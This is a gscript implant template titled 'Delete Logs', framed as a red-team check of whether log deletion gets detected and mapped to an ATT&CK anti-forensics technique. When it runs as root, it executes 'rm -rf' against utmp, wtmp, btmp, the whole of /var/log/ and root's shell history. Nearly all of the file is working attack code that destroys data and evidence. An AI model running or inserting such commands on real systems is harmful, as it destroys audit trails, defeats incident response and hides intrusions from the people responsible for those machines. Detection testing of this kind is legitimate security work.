// Example gscript template
// Title: Delete Logs
// Author: ahhh
// Purpose: Deletes a number of critical security logs on a linux machine, to see if this is detected by the lack of logs or deletion
// Gscript version: 1.0.0
// ATT&CK: https://attack.mitre.org/wiki/Technique/T1146
// Note: must run implant as root

//go_import:os/user as user

//priority:150
//timeout:150

function Deploy() {  
    console.log("starting execution of Delete Logs");
    // Whoami
    var myuser = user.Current();
    console.log("Our user is: "+Dump(myuser[0]));
    if (myuser[0].Username == "root") {
        //rm -rf /var/run/utmp /var/run/wtmp /var/run/btmp /var/log/
        var response = G.exec.ExecuteCommand("rm", ["-rf", "-P", "/var/run/utmp", "/var/run/wtmp", "/var/run/btmp", "/var/log/"]);
        console.log("Pid: "+response[0]);
        console.log("stdout: "+response[1]);
        console.log("stderr: "+response[2]);
        console.log("exit code: "+response[3]);
        console.log("go errors: "+response[4]);
        console.log("Removed /var/run/utmp, /var/run/wtmp, /var/run/btmp, and all of /var/log/");
        var response2 = G.exec.ExecuteCommand("rm", ["-rf", "-P", "/var/root/.sh_history"]);
        console.log("Pid: "+response2[0]);
        console.log("stdout: "+response2[1]);
        console.log("stderr: "+response2[2]);
        console.log("exit code: "+response2[3]);
        console.log("go errors: "+response2[4]);
        console.log("Cleared the root bash history");
    } else {
        console.log("Detected a non-root user, this needs to run as root!");
    } 
    return true;
}
  